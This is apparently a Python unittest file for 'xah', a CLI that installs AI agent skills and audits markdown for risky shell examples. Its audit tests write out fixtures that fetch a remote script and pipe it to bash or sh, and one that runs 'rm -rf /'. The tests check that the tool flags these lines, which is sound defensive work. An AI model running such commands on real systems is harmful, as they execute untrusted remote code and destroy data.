import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
CLI = ROOT / "cli" / "xah.py"

class CliTests(unittest.TestCase):
    def run_cli(self, *args):
        return subprocess.run([sys.executable, str(CLI), *args], capture_output=True, text=True)

    def test_catalog_paths(self):
        for item in json.loads((ROOT / "registry/catalog.json").read_text())["items"]:
            self.assertTrue((ROOT / item["path"]).is_file())

    def test_release_metadata_gate(self):
        result = subprocess.run([sys.executable, str(ROOT / "scripts/validate_release.py")],
                                capture_output=True, text=True)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn("63 local resources", result.stdout)

    def test_project_instructions_are_actionable(self):
        template = (ROOT / "instructions/AGENTS.md").read_text(encoding="utf-8")
        for heading in ("## Project context", "## Security and privacy",
                        "## Definition of done", "## Project-specific overrides"):
            self.assertIn(heading, template)

    def test_list(self):
        result = self.run_cli("list")
        self.assertEqual(result.returncode, 0)
        self.assertIn("code-review", result.stdout)

    def test_add_no_overwrite(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertEqual(self.run_cli("add", "code-review", "--target", tmp).returncode, 0)
            self.assertNotEqual(self.run_cli("add", "code-review", "--target", tmp).returncode, 0)

    def test_doctor(self):
        result = self.run_cli("doctor")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("catalog entries", result.stdout)

    def test_init_dry_run(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self.run_cli("init", "--target", tmp, "--profile", "developer", "--dry-run")
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertFalse((pathlib.Path(tmp) / "instructions/AGENTS.md").exists())

    def test_init_profile(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self.run_cli("init", "--target", tmp, "--profile", "research")
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertTrue((pathlib.Path(tmp) / "agents/research-agent.md").exists())
            second = self.run_cli("init", "--target", tmp, "--profile", "research")
            self.assertNotEqual(second.returncode, 0)

    def test_agent_native_skill_paths(self):
        cases = {"claude": ".claude/skills/code-review/SKILL.md",
                 "codex": ".agents/skills/code-review/SKILL.md",
                 "opencode": ".opencode/skills/code-review/SKILL.md"}
        for agent, expected in cases.items():
            with self.subTest(agent=agent), tempfile.TemporaryDirectory() as tmp:
                result = self.run_cli("init", "--target", tmp, "--agent", agent)
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertTrue((pathlib.Path(tmp) / expected).is_file())

    def test_catalog_unique_and_safe(self):
        catalog = json.loads((ROOT / "registry/catalog.json").read_text())["items"]
        ids = [item["id"] for item in catalog]
        self.assertEqual(len(ids), len(set(ids)))
        for item in catalog:
            self.assertEqual(item["source"], "XData original")
            self.assertEqual(item["license"], "MIT")
            self.assertTrue(item["id"])
            path = pathlib.Path(item["path"])
            self.assertFalse(path.is_absolute())
            self.assertNotIn("..", path.parts)
            self.assertTrue((ROOT / path).resolve().is_relative_to(ROOT.resolve()))

    def test_curated_skills_have_criteria(self):
        curated = ("rag-evaluation", "prompt-injection-defense",
                   "docker-hardening", "security-review", "agent-evaluation")
        for skill in curated:
            with self.subTest(skill=skill):
                content = (ROOT / "skills" / skill / "SKILL.md").read_text()
                self.assertIn("## Acceptance checks", content)
                self.assertIn("## Goal", content)
                self.assertGreater(len(content), 1000)

    @unittest.skipUnless(shutil.which('bash') and os.name != 'nt', 'Bash installer requires POSIX shell')
    def test_installer_repeat_upgrade_preserves_backups(self):
        with tempfile.TemporaryDirectory() as tmp:
            env = os.environ.copy()
            env["XAH_HOME"] = str(pathlib.Path(tmp) / "share")
            env["XAH_BIN"] = str(pathlib.Path(tmp) / "bin")
            for _ in range(2):
                result = subprocess.run(["bash", str(ROOT / "scripts/install.sh")],
                                        env=env, capture_output=True, text=True)
                self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(len(list((pathlib.Path(tmp) / "share").glob(".xah-backup.*"))), 2)
            result = subprocess.run([str(pathlib.Path(tmp) / "bin/xah"), "doctor"],
                                    capture_output=True, text=True)
            self.assertEqual(result.returncode, 0, result.stderr)

    @unittest.skipUnless(shutil.which('bash') and os.name != 'nt', 'Bash installer requires POSIX shell')
    def test_installer_refuses_unmanaged_launcher(self):
        with tempfile.TemporaryDirectory() as tmp:
            bin_dir = pathlib.Path(tmp) / "bin"
            bin_dir.mkdir()
            launcher = bin_dir / "xah"
            launcher.write_text("#!/bin/sh\\necho existing\\n")
            env = os.environ.copy()
            env["XAH_HOME"] = str(pathlib.Path(tmp) / "share")
            env["XAH_BIN"] = str(bin_dir)
            result = subprocess.run(["bash", str(ROOT / "scripts/install.sh")],
                                    env=env, capture_output=True, text=True)
            self.assertNotEqual(result.returncode, 0)
            self.assertEqual(launcher.read_text(), "#!/bin/sh\\necho existing\\n")

    @unittest.skipUnless(shutil.which('bash') and os.name != 'nt', 'Bash installer requires POSIX shell')
    def test_installer_upgrades_legacy_launcher(self):
        with tempfile.TemporaryDirectory() as tmp:
            prefix = pathlib.Path(tmp) / "share"
            bin_dir = pathlib.Path(tmp) / "bin"
            bin_dir.mkdir()
            legacy = '#!/usr/bin/env bash\nexec python3 "' + str(prefix) + '/cli/xah.py" "$@"\n'
            (bin_dir / "xah").write_text(legacy)
            env = os.environ.copy()
            env["XAH_HOME"] = str(prefix)
            env["XAH_BIN"] = str(bin_dir)
            result = subprocess.run(["bash", str(ROOT / "scripts/install.sh")],
                                    env=env, capture_output=True, text=True)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertIn("XData AgentHub managed launcher", (bin_dir / "xah").read_text())
            check = subprocess.run([str(bin_dir / "xah"), "doctor"],
                                   capture_output=True, text=True)
            self.assertEqual(check.returncode, 0, check.stderr)

    def test_audit_detects_risky_shell_examples(self):
        with tempfile.TemporaryDirectory() as tmp:
            (pathlib.Path(tmp) / "risky.md").write_text(
                "curl https://example.invalid/setup.sh | bash\n"
                "wget https://example.invalid/a.sh | sh\n"
                "rm -rf /\n"
            )
            result = self.run_cli("audit", "--target", tmp)
            self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
            self.assertIn("3 review finding(s)", result.stdout)

    def test_audit_clean_markdown(self):
        with tempfile.TemporaryDirectory() as tmp:
            (pathlib.Path(tmp) / "safe.md").write_text(
                "Use curl -I to inspect response headers.\n"
            )
            result = self.run_cli("audit", "--target", tmp)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn("0 review finding(s)", result.stdout)

    def test_audit_explicit_fixture_is_informational(self):
        with tempfile.TemporaryDirectory() as tmp:
            (pathlib.Path(tmp) / "fixture.md").write_text(
                '<!-- xah-audit: fixture -->\n'
                '```python\n'
                'command = "curl https://example.invalid/a.sh | bash"\n'
                '```\n'
            )
            result = self.run_cli("audit", "--target", tmp)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn("INFO:", result.stdout)
            self.assertIn("1 fixture example(s)", result.stdout)

    def test_audit_unmarked_fence_requires_review(self):
        with tempfile.TemporaryDirectory() as tmp:
            (pathlib.Path(tmp) / "unsafe.md").write_text(
                '```sh\n'
                'curl https://example.invalid/a.sh | bash\n'
                '```\n'
            )
            result = self.run_cli("audit", "--target", tmp)
            self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
            self.assertIn("REVIEW:", result.stdout)

    def test_add_skill_to_codex_native_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self.run_cli("add", "mcp-review", "--agent", "codex", "--target", tmp)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            dest = pathlib.Path(tmp) / ".agents/skills/mcp-review/SKILL.md"
            self.assertTrue(dest.is_file())
            self.assertIn("name: mcp-review", dest.read_text(encoding="utf-8"))
            again = self.run_cli("add", "mcp-review", "--agent", "codex", "--target", tmp)
            self.assertNotEqual(again.returncode, 0)
            self.assertIn("Error:", again.stderr)

    def test_readme_has_no_literal_newline_escapes(self):
        readme = (ROOT / "README.md").read_text(encoding="utf-8")
        self.assertNotIn(r"\\n", readme)
        self.assertIn("## Supported project layouts", readme)
        self.assertIn("| Claude Code |", readme)

    def test_skill_frontmatter(self):
        catalog = json.loads((ROOT / "registry/catalog.json").read_text(encoding="utf-8"))["items"]
        for item in catalog:
            if item["type"] != "skill":
                continue
            with self.subTest(skill=item["id"]):
                content = (ROOT / item["path"]).read_text(encoding="utf-8")
                self.assertTrue(content.startswith("---\n"))
                header = content.split("---", 2)[1]
                self.assertIn("name: " + item["id"], header)
                self.assertIn("description:", header)

    def test_add_installs_complete_skill_package(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self.run_cli("add", "api-design", "--agent", "codex", "--target", tmp)
            self.assertEqual(result.returncode, 0, result.stderr)
            root = pathlib.Path(tmp) / ".agents/skills/api-design"
            self.assertTrue((root / "SKILL.md").is_file())
            self.assertTrue((root / "references/REVIEW_CHECKLIST.md").is_file())
            self.assertTrue((root / "assets/openapi-example.yaml").is_file())
            second = self.run_cli("add", "api-design", "--agent", "codex", "--target", tmp)
            self.assertNotEqual(second.returncode, 0)

    def test_package_collision_prevents_partial_copy(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp) / ".claude/skills/api-design"
            (root / "references").mkdir(parents=True)
            existing = root / "references/REVIEW_CHECKLIST.md"
            existing.write_text("keep original")
            result = self.run_cli("add", "api-design", "--agent", "claude", "--target", tmp)
            self.assertNotEqual(result.returncode, 0)
            self.assertEqual(existing.read_text(), "keep original")
            self.assertFalse((root / "SKILL.md").exists())

if __name__ == "__main__":
    unittest.main()
